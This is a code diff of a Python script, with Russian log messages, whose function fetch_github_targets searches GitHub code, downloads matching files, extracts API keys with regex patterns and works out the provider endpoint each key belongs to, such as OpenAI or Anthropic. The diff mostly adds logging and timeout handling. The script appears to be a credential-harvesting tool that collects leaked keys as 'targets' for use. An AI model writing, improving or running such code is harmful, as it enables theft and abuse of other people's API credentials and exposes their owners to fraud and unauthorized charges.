@@ -113,63 +113,75 @@ def fetch_github_targets():
     
     try:
         resp = requests.get("https://api.github.com/search/code", headers=headers, params={"q": query, "per_page": 50, "page": page}, timeout=15)
-        if resp.status_code == 403: return []
+        if resp.status_code == 403: 
+            logger.error("❌ GitHub 403: Лимит поиска или неверный токен.")
+            return []
         resp.raise_for_status()
         
+        items = resp.json().get("items", [])
+        logger.info(f"📄 Найдено файлов на странице {page}: {len(items)}")
+        
         targets = []
-        for item in resp.json().get("items", [])[:30]:
+        for i, item in enumerate(items[:20], 1): # Ограничили 20 файлами
             repo, path = item["repository"]["full_name"], item["path"]
-            file_resp = requests.get(f"https://api.github.com/repos/{repo}/contents/{path}", headers={"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github.raw+json"}, timeout=10)
+            logger.info(f"   └ [{i}/{min(len(items), 20)}] Скачиваю {repo}...")
             
-            if file_resp.status_code == 200:
-                for line in file_resp.text.split('\n'):
-                    for p in KEY_PATTERNS:
-                        for match in p["regex"].finditer(line):
-                            token = match.group(0)
-                            api_urls = []
-                            
-                            # ПРИОРИТЕТ 1: URL в этой же строке
-                            for u in URL_REGEX.findall(line):
-                                if any(x in u for x in ['github.com', 'telegram', 'w3.org', '.jpeg', '.png']): continue
-                                match_url = re.search(r'(.*?/v\d+(?:beta\d*)?|.*?/api)', u)
-                                if match_url: api_urls.append(match_url.group(1))
-                            
-                            # ПРИОРИТЕТ 2: Префикс ключа
-                            if not api_urls and p["provider"] != "generic-sk":
-                                api_urls.append(PROVIDER_ENDPOINTS.get(p["provider"]))
-                            
-                            # ПРИОРИТЕТ 3: Конфиги репо (Trees API)
+            try:
+                file_resp = requests.get(f"https://api.github.com/repos/{repo}/contents/{path}", headers={"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github.raw+json"}, timeout=5)
+                if file_resp.status_code != 200:
+                    logger.info(f"      ⚠️ Не удалось скачать (код {file_resp.status_code})")
+                    continue
+            except requests.RequestException as e:
+                logger.info(f"      ⚠️ Таймаут при скачивании: {e}")
+                continue
+                
+            lines = file_resp.text.split('\n')
+            for line in lines:
+                for p in KEY_PATTERNS:
+                    for match in p["regex"].finditer(line):
+                        token = match.group(0)
+                        api_urls = []
+                        
+                        for u in URL_REGEX.findall(line):
+                            if any(x in u for x in ['github.com', 'telegram', 'w3.org', '.jpeg', '.png']): continue
+                            match_url = re.search(r'(.*?/v\d+(?:beta\d*)?|.*?/api)', u)
+                            if match_url: api_urls.append(match_url.group(1))
+                        
+                        if not api_urls and p["provider"] != "generic-sk":
+                            api_urls.append(PROVIDER_ENDPOINTS.get(p["provider"]))
+                        
+                        if not api_urls:
+                            # Добавили лог для Trees API, так как он тоже может тупить
+                            logger.info(f"      🔍 Ищу эндпоинт в конфигах для {token[:8]}...")
+                            api_urls.extend(get_urls_from_repo_configs(repo)[:1])
+                        
+                        if not api_urls:
+                            var_match = re.search(r'([A-Za-z0-9_]+)\s*=', line)
+                            var_name = var_match.group(1).lower() if var_match else ""
+                            for hint, url in REPO_HINTS.items():
+                                if hint in var_name: api_urls.append(url); break
                             if not api_urls:
-                                api_urls.extend(get_urls_from_repo_configs(repo)[:1])
-                            
-                            # ПРИОРИТЕТ 4: Переменная
-                            if not api_urls:
-                                var_match = re.search(r'([A-Za-z0-9_]+)\s*=', line)
-                                var_name = var_match.group(1).lower() if var_match else ""
-                                for hint, url in REPO_HINTS.items():
-                                    if hint in var_name: api_urls.append(url); break
-                                if not api_urls:
-                                    if "openai" in var_name: api_urls.append(PROVIDER_ENDPOINTS["openai"])
-                                    elif "anthropic" in var_name: api_urls.append(PROVIDER_ENDPOINTS["anthropic"])
-                            
-                            # ПРИОРИТЕТ 5: Имя репо
-                            if not api_urls:
-                                combined = (repo + " " + path).lower()
-                                for hint, url in REPO_HINTS.items():
-                                    if hint in combined: api_urls.append(url); break
-                                    
-                            # ПРИОРИТЕТ 6: Дефолт
-                            if not api_urls:
-                                api_urls.append(PROVIDER_ENDPOINTS["default"])
+                                if "openai" in var_name: api_urls.append(PROVIDER_ENDPOINTS["openai"])
+                                elif "anthropic" in var_name: api_urls.append(PROVIDER_ENDPOINTS["anthropic"])
+                        
+                        if not api_urls:
+                            combined = (repo + " " + path).lower()
+                            for hint, url in REPO_HINTS.items():
+                                if hint in combined: api_urls.append(url); break
                                 
-                            for url in list(set(api_urls))[:1]:
-                                if url: targets.append({"key": token, "endpoint": url.rstrip('/'), "provider": p["provider"]})
+                        if not api_urls:
+                            api_urls.append(PROVIDER_ENDPOINTS["default"])
+                            
+                        for url in list(set(api_urls))[:1]:
+                            if url: targets.append({"key": token, "endpoint": url.rstrip('/'), "provider": p["provider"]})
             time.sleep(0.2) 
             
         unique_targets, seen = [], set()
         for t in targets:
             sig = f"{t['key']}_{t['endpoint']}"
             if sig not in seen: seen.add(sig); unique_targets.append(t)
+            
+        logger.info(f"✅ Парсинг завершен. Найдено уникальных целей: {len(unique_targets)}")
         return unique_targets
     except Exception as e:
         logger.error(f"❌ Ошибка GitHub: {e}")
